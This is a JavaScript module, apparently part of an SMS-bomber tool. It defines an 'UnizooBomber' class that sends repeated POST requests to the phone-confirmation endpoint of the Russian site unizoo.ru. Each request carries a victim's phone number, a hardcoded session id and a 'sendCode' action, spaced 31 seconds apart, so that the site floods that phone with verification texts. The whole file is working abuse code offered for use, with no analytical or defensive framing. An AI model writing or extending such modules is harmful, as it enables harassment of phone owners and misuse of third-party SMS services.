const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class UnizooBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = this.formUrlEncoded({
            action: "sendCode",
            phone: this.phone,
            authType: "register",
            repeatToEmail: false,
            sessionId: "25657585cb7dd62f6ed62bee3e2a18b6"
        });
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "unizoo";
    delay = 31000;
    url = `https://unizoo.ru/local/components/techdir/auth.phone.confirmation.sms/ajax/handler.php`;  
}
module.exports = UnizooBomber;